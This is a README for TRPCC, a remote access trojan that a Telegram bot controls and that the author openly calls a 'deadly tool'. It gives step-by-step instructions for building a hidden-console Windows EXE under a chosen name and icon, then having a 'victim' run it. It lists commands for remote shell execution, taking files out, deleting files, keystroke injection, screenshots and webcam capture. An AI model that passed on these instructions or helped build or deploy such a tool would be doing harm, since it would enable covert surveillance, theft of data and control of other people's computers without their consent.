huge update coming
<h1 align="center"><img src="icon.png"><br>TRPCC</h1>
<h3 align="center">Telegram Remote PC Control. [ALPHA V1.0].</h3>
<p align="center">Deadly tool for remote PC controlling (RAT).</p><br><br><p align="center"><b>⚠ WARNING ⚠<br>I do not accept responsibility for any use of this tool.</b></p><br><br>

## Using:
1. `git clone https://github.com/xzripper/trpcc`
2. `python deps.py`
3. `python trpcc.py`
4. Set Telegram bot token (2). (Create bot and get token in <a href="https://t.me/BotFather">@BotFather</a>)
5. Compile bot to .EXE (1).
  1. Set your application name.
  2. Debug (y/N)? Console will be shown if debug enabled, else no console will be open.
  3. Icon (.ico supported only), `none` if no icon.
  4. Wait.
<br>
Done! Your EXE is ready! Now victim should run EXE file and reboot PC (can reboot later). Done! Start your bot and control PC!<br>

# Commands.

**Generic commands**:<br>
/start - Start bot.<br>
/help - Get help.<br>
/about - Get about.<br>

**System commands**:<br>
/sysinfo - Get system information.<br>
/syscom - Pass command to console and get output. Can cause TelegramBadRequest error if output is too big.<br>

**Work with files**:<br>
/insertfile (DIRECTORY) - Insert file into directory. After passing command you should send file you want to insert.<br>
/getfile (FILE) - Get file by path.<br>
/getdir (DIRECTORY) - Get directory as ZIP.<br>
/dir (DIRECTORY) - Get directory content. Can cause TelegramBadRequest error if output is too big.<br>
/exists (FILE/DIRECTORY) - Is file/directory exists.<br>
/delete (FILE/DIRECTORY) - Delete file/directory.<br>
/startfile (FILE) - Start file.<br>

**Hardware (keyboard, mouse, monitor)**:<br>
/sendkeys (KEYS) - Press keys. Hotkeys and multiple key pressing at once supported: `alt+tab,win+space`.<br>
/type (TEXT) - Type text.<br>
/mousebutton (BUTTON) - Click mouse button. Buttons: 1 - Right, 2 - Left, 3 - Middle.<br>
/setmousepos (X) (Y) - Set cursor position.<br>
/enablemonitor - Enable monitor. Very unstable.<br>
/disablemonitor - Disable monitor. Very unstable.<br>

**Screenshots**:<br>
/screenshot - Make screenshot.<br>

**Power**:<br>
/shutdown - Shutdown PC.<br>
/reboot - Reboot PC.<br>

**Python**:<br>
/evalpython (CODE(EXPRESSION)) - Evaluate Python expression. Can evaluate pretty big code if you can write one-liners.<br>

**Time**:<br>
/date - Get local PC date.<br>

**Message Boxes**:<br>
/msgbox [TITLE] [TEXT] - Show messsage box.<br>

**Clipboard**:<br>
/copy (TEXT) - Copy text to clipboard.<br>

**Sounds**:<br>
/playsound - Play sound from controller side. After passing command you should send MP3/WAV file to play sound.<br>
/playlocalsound (PATH) - Play sound from client side.<br>

**Windows**:<br>
/getactivewindow - Get active window name, title, HWND.<br>
/closeactivewindow - Close active window.<br>

**Volume**:<br>
/upvolume (AMOUNT) - Increase volume.<br>
/downvolume (AMOUNT) - Decrease volume.<br>

**Webcamera**:<br>
/webcamimage (INDEX) - Capture image from web camera. Indexes start from 0 and end when all available web cameras end.<br>

**Bot commands**:<br>
/alive - Is bot alive.<br>
/cancelloads - Cancel all file loads. Use it to cancel file loads after using `playsound`, or `insertfile`.<br><br>

TRPCC V1.0 By xzripper.
